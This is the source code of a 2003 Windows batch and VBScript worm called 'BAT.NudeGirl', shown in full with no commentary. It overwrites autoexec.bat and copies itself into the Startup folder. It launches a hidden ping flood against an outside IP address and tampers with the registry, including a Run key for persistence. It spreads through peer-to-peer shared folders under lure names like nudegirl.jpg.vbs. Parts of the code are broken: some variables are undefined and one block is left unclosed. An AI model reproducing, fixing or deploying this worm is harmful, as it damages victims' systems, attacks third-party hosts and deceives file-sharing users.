@echo off
:: BAT.NudeGirl
:: Written by Dr Virus Quest
:: Created on 24 July 2003
Echo y| Copy %0 c:\windows\startm~1\programs\startup\rundll32.bat >nul
del c:\autoexec.bat
Echo y| Copy %0 c:\autoexec.bat >nul
Echo On Error Resume Next >NudeGirl.jpg.vbs
Echo Shell "ping -t -l 65500 209.197.228.32", vbHide >>NudeGirl.jpg.vbs
Echo dim fso,reg,x >>NudeGirl.jpg.vbs
Echo Set fso = CreateObject("Scripting.FileSystemObject") >>NudeGirl.jpg.vbs
Echo set reg=createobject("wscript.shell") >>NudeGirl.jpg.vbs
Echo Set x = fso.getfile(WScript.ScriptFullName) >>NudeGirl.jpg.vbs
Echo x.copy(win&"\rundll32.vbs") >>NudeGirl.jpg.vbs
Echo reg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","DumbaSS" >>NudeGirl.jpg.vbs
Echo KMD = ("C:\Program Files\KMD\My Shared Folder")& "\" >>NudeGirl.jpg.vbs
Echo Kazaa = ("C:\Program Files\Kazaa\My Shared Folder") & "\" >>NudeGirl.jpg.vbs
Echo KazaaLite = ("C:\Program Files\KaZaA Lite\My Shared Folder") & "\" >>NudeGirl.jpg.vbs
Echo Morpheus = ("C:\Program Files\Morpheus\My Shared Folder") & "\" >>NudeGirl.jpg.vbs
Echo if fso.folderexists(KMD) then >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, KMD & "nudegirl.jpg.vbs" >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, KMD & "nudegirl.mpg.vbs" >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, KMD & "nudegirl.swf.vbs" >>NudeGirl.jpg.vbs
Echo end if >>NudeGirl.jpg.vbs
Echo if fso.folderexists(Kazaa) then >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, Kazaa & "nudegirl.jpg.vbs" >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, Kazaa & "nudegirl.mpg.vbs" >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, Kazaa & "nudegirl.swf.vbs" >>NudeGirl.jpg.vbs
Echo end if >>NudeGirl.jpg.vbs
Echo if fso.folderexists(KazaaLite) then >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, KazaaLite & "nudegirl.jpg.vbs" >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, KazaaLite & "nudegirl.mpg.vbs" >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, KazaaLite & "nudegirl.swf.vbs" >>NudeGirl.jpg.vbs
Echo end if >>NudeGirl.jpg.vbs >>NudeGirl.jpg.vbs
Echo if fso.folderexists(Morpheus) then >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, Morpheus & "nudegirl.jpg.vbs" >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, Morpheus & "nudegirl.mpg.vbs" >>NudeGirl.jpg.vbs
Echo fso.copyfile MyWorm, Morpheus & "nudegirl.swf.vbs" >>NudeGirl.jpg.vbs
Echo end if >>NudeGirl.jpg.vbs
Echo If day(now)=7 then >>NudeGirl.jpg.vbs
Echo Msgbox "You like girls to be naked?" >>NudeGirl.jpg.vbs
Echo On Error Resume Next >NudeGirl.vbs
Echo Open "c:\nudegirl.reg" For Output As 1 >>NudeGirl.vbs
Echo Print #1, "REGEDIT4" >>NudeGirl.vbs
Echo Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]" >>NudeGirl.vbs
Echo Print #1, """System Monitor""=""\""c:\\WINDOWS\\SYSNOM.EXE\""""" >>NudeGirl.vbs
Echo Close 1 >>NudeGirl.vbs
Echo Shell "regedit /s c:\nudegirl.reg" >>NudeGirl.vbs
Echo Kill "c:\nudegirl.reg" >>NudeGirl.vbs